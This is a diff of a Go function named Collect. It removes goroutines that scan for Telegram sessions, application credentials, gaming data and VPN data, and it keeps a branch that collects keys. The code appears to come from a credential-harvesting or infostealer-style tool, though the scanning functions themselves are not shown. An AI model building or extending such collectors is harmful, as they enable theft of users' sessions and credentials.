@@ -135,22 +135,6 @@ func Collect(opts types.CollectOptions, partialFn func(*types.CollectionResult))
 		}()
 	}
 
-	if opts.Telegram {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			sessions := scanner.ScanTelegram()
-			if len(sessions) > 0 {
-				mu.Lock()
-				result.Telegram = append(result.Telegram, sessions...)
-				mu.Unlock()
-				if partialFn != nil {
-					partialFn(&types.CollectionResult{Telegram: sessions})
-				}
-			}
-		}()
-	}
-
 	if opts.Keys {
 		wg.Add(1)
 		go func() {
@@ -162,54 +146,6 @@ func Collect(opts types.CollectOptions, partialFn func(*types.CollectionResult))
 				mu.Unlock()
 				if partialFn != nil {
 					partialFn(&types.CollectionResult{Keys: keys})
-				}
-			}
-		}()
-	}
-
-	if opts.Apps {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			apps := scanner.ScanApps()
-			if len(apps) > 0 {
-				mu.Lock()
-				result.AppCredentials = append(result.AppCredentials, apps...)
-				mu.Unlock()
-				if partialFn != nil {
-					partialFn(&types.CollectionResult{AppCredentials: apps})
-				}
-			}
-		}()
-	}
-
-	if opts.Gaming {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			gaming := ScanGaming()
-			if gaming != nil {
-				mu.Lock()
-				result.Gaming = gaming
-				mu.Unlock()
-				if partialFn != nil {
-					partialFn(&types.CollectionResult{Gaming: gaming})
-				}
-			}
-		}()
-	}
-
-	if opts.VPNs {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			vpns := ScanVPNs()
-			if vpns != nil {
-				mu.Lock()
-				result.VPNs = vpns
-				mu.Unlock()
-				if partialFn != nil {
-					partialFn(&types.CollectionResult{VPNs: vpns})
 				}
 			}
 		}()
